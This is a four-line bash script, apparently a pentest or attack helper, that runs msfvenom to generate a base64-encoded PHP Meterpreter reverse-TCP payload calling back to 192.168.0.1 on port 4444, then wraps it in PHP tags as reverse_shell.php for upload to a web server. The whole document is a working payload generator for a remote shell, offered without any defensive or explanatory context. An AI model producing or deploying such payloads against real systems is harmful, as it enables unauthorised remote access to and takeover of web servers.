#!/bin/bash
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 lport=4444 -e php/base64 -f raw > reverse_shell.php;
echo '<?php' | cat - reverse_shell.php > temp && mv temp reverse_shell.php;
echo '?>' >> reverse_shell.php;

